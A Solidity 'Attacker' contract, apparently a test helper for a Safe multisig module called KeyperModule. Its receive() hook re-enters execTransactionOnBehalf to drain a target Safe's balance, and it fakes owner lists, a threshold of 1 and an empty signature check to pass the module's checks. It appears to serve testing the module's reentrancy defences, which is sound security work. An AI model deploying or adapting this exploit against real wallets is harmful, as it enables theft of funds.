// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import {KeyperModule} from "../src/KeyperModule.sol";
import {Enum} from "@safe-contracts/common/Enum.sol";
import {console} from "forge-std/console.sol";

contract Attacker {

    address public orgFromAttacker;
    address public targetSafeFromAttacker;
    bytes public dataFromAttacker;
    bytes public signaturesFromAttacker;

    KeyperModule public keyperModule;

    constructor(address _contractToAttackAddress) {
        keyperModule = KeyperModule(_contractToAttackAddress);
    }

    //this is called when Attackee sends Ether to this contract (Attacker)
    receive() external payable {
        if(address(targetSafeFromAttacker).balance > 0 gwei) {
            keyperModule.execTransactionOnBehalf(
                orgFromAttacker, 
                targetSafeFromAttacker,
                address(this), 
                address(targetSafeFromAttacker).balance, 
                dataFromAttacker, 
                Enum.Operation(0), 
                signaturesFromAttacker
            );
        }
    }

    function performAttack(
        address org,
        address targetSafe,
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        bytes memory signatures
    ) external returns (bool result) {
        setParamsForAttack(org, targetSafe, data, signatures);
        result = keyperModule.execTransactionOnBehalf(
            org, 
            targetSafe, 
            to, 
            value, 
            data, 
            operation, 
            signatures
        );
        return true;
    }

    function getBalanceFromSafe(address _safe)
        external
        view
        returns (uint256)
    {
        return address(_safe).balance;
    }

    function getBalanceFromAttacker() 
        external 
        view 
        returns (uint256) 
    {
        return address(this).balance;
    }

    function checkSignatures(
        bytes32 dataHash, 
        bytes memory data, 
        bytes memory signatures
    ) external view {}

    function getOwners() public pure returns (address[] memory) {
        address[] memory owners = new address[](2);
        //The following address are hardcoded from victim's owners
        owners[0] = 0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69;
        owners[1] = 0xe1AB8145F7E55DC933d51a18c793F901A3A0b276;
        return owners;
    }

    function getThreshold() public pure returns (uint256) {
        return uint256(1);
    }

    function setParamsForAttack(
        address _org,
        address _targetSafe,
        bytes calldata _data,
        bytes memory _signatures
    ) internal {
        orgFromAttacker = _org;
        targetSafeFromAttacker = _targetSafe;
        dataFromAttacker = _data;
        signaturesFromAttacker = _signatures;
    }
}
